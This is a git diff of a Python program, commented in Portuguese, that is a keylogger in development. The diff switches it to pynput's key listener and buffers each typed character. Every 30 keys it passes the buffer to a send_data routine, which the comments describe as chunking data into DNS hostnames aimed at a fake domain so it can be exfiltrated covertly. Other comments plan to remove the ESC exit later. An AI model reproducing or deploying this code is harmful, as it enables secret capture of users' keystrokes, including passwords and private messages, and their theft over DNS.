@@ -5,7 +5,7 @@ import os
 import time
 import socket
 import threading
-import keyboard
+from pynput import keyboard
 from dnslib import DNSRecord, RR, A
 
 ###############################################################
@@ -16,8 +16,7 @@ from dnslib import DNSRecord, RR, A
 # _NAME = 'licence.dll'
 _DNS_ADDR = ('127.0.0.1', 9953)
 _FAKE_DOMAIN = '.example.com'
-_KEYS = ''
-_LAST_KEY = None
+_KEYS = []
 
 ###############################################################
 # Classes e Funções
@@ -34,6 +33,13 @@ def send_data(data):
         None    
     '''
     global _DNS_ADDR, _FAKE_DOMAIN
+
+    print('vou enviar algo')
+
+    # Convertendo para bytes usando somente 8 bits para economizar
+    # espaço, data seria enviado pela rede
+    #data = [entry.to_bytes(1, 'big') for entry in data]
+    #print(data)
 
     # Divide os dados em partes menores para serem válidos
     # como nomes de domínio máximo de 63bytes por hostname.
@@ -69,7 +75,7 @@ def send_data(data):
         # Não sei se precisa disso...
         sock.close()
 
-def on_key_event(e):
+'''def on_key_event(e):
     global _KEYS, _LAST_KEY
     
     # Só envio quando bater o tamanho máximo de envio por DNS
@@ -119,11 +125,45 @@ def on_key_event(e):
                 _KEYS += key
     
     # Apenasas verificando, remover esse print mais tarde
-    print(_KEYS)
+    print(_KEYS)'''
+
+def on_release(key):
+    global _KEYS
+
+    # Só envio quando bater o tamanho máximo de envio por DNS
+    if len(_KEYS) >= 30:
+        send_data(_KEYS)
+        _KEYS = []
+
+    # ESC para sair, tirar depois
+    if key == keyboard.Key.esc:
+        return False
+
+    try:
+        # Teclas normais são adicionadas normalmente
+        _KEYS.append(key.char)
+
+    except AttributeError:
+        # Teclas especiais (shift, enter, ctrl, alt, ...)
+        # Possíveis valores em
+        # https://pynput.readthedocs.io/en/latest/_modules/pynput/keyboard/_base.html#Key
+        
+        if key == key.space:
+            _KEYS.append(' ')
+
+        elif key == key.backspace:
+            _KEYS = _KEYS[:-1]
+
+        elif key == key.enter:
+            _KEYS += ' \n'
+
+        '''else:
+            print(key)'''
 
 ###############################################################
 # Main
 ###############################################################
 if __name__ == "__main__":
-    keyboard.hook(on_key_event)
-    keyboard.wait('esc') # Mudar para nada futuramente
+    lst = keyboard.Listener(on_release=on_release)
+    lst.start()
+    lst.join()
